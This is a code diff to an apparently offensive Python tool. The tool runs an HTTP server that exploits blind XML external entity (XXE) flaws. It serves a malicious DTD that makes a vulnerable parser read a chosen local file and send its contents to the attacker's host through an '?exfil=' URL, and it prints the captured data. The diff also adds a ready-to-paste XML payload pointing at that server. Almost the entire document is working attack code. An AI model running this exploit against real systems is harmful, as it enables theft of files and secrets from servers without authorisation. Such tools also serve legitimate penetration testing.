@@ -58,7 +58,13 @@ config = {
 
 EXFILTRATED_EVENT = threading.Event()
 
+def dbg(x):
+    if config['debug']:
+        print('[dbg] {}'.format(x))
+
+
 class BlindXXEServer(BaseHTTPRequestHandler):
+    method = ''
 
     def response(self, **data):
         code = data.get('code', 200)
@@ -72,9 +78,11 @@ class BlindXXEServer(BaseHTTPRequestHandler):
         self.wfile.close()
 
     def do_GET(self):
+        self.method = 'GET'
         self.request_handler(self)
 
     def do_POST(self):
+        self.method = 'POST'
         self.request_handler(self)
 
     def log_message(self, format, *args):
@@ -83,28 +91,38 @@ class BlindXXEServer(BaseHTTPRequestHandler):
     def request_handler(self, request):
         global EXFILTRATED_EVENT
 
+        print('[.] Incoming HTTP request from {}: {} {}'.format(
+            self.client_address[0],
+            request.method,
+            request.path[:25]
+        ))
+
         path = urllib.unquote(request.path).decode('utf8')
         m = re.search('\/\?exfil=(.*)', path, re.MULTILINE)
         if m and request.command.lower() == 'get':
             data = path[len('/?exfil='):]
-            print 'Exfiltrated %s:' % EXFIL_FILE
-            print '-' * 30
-            print urllib.unquote(data).decode('utf8')
-            print '-' * 30 + '\n'
+            print('\n[+] Exfiltrated %s:' % config['exfil-file'])
+            print('-' * 30)
+            print(urllib.unquote(data).decode('utf8'))
+            print('-' * 30 + '\n')
             self.response(body='true')
 
             EXFILTRATED_EVENT.set()
 
         elif request.path.endswith('.dtd'):
-            #print '[DEBUG] Sending malicious DTD file.'
+            dbg('Sending malicious DTD file.')
             dtd = '''<!ENTITY %% param_exfil SYSTEM "%(exfil_file)s">
-<!ENTITY %% param_request "<!ENTITY exfil SYSTEM 'http://%(exfil_host)s/?exfil=%%param_exfil;'>">
-%%param_request;''' % {'exfil_file' : config['exfil-file'], 'exfil_host' : config['rhost']}
+<!ENTITY %% param_request "<!ENTITY exfil SYSTEM 'http://%(exfil_host)s:%(exfil_port)d/?exfil=%%param_exfil;'>">
+%%param_request;''' % {
+                'exfil_file' : config['exfil-file'], 
+                'exfil_host' : config['rhost'], 
+                'exfil_port' : config['port']
+            }
 
             self.response(content_type='text/xml', body=dtd)
 
         else:
-            #print '[INFO] %s %s' % (request.command, request.path)
+            dbg('%s %s' % (request.command, request.path))
             self.response(body='false')
 
 
@@ -134,6 +152,8 @@ def parseOptions(argv):
     config['rhost'] = args.rhost
     config['exfil-file'] = args.file
 
+    print('[::] File to be exfiltrated: "{}"'.format(args.file))
+
     port = int(args.port)
     if port < 1 or port > 65535:
         Logger.err("Invalid port number. Must be in <1, 65535>")
@@ -144,7 +164,6 @@ def parseOptions(argv):
 def fetchRhost():
     global config
     config['rhost'] = socket.gethostbyname(socket.gethostname())
-
 
 def main(argv):
     global config
@@ -159,16 +178,24 @@ def main(argv):
     print('[+] Serving HTTP server on: ("{}", {})'.format(
         config['listen'], config['port']
     ))
-    print('[+] RHOST set to: {}'.format(config['rhost']))
+    dbg('RHOST set to: {}'.format(config['rhost']))
+
+    rhost = config['listen']
+    if config['listen'] == '0.0.0.0':
+        rhost = config['rhost']
 
     print('\n[>] Here, use the following XML to leverage Blind XXE vulnerability:')
     print('''
-
+===
 <?xml version="1.0"?>
-<!DOCTYPE foo SYSTEM "http://{}/test.dtd">
+<!DOCTYPE foo SYSTEM "http://{}:{}/test.dtd">
 <foo>&exfil;</foo>
+===
 
-    '''.format(config['rhost']))
+PS: Don't forget to set:
+    Content-Type: text/xml
+
+    '''.format(rhost, config['port']))
 
     server = HTTPServer((config['listen'], config['port']), BlindXXEServer)
     thread = threading.Thread(target=server.serve_forever)
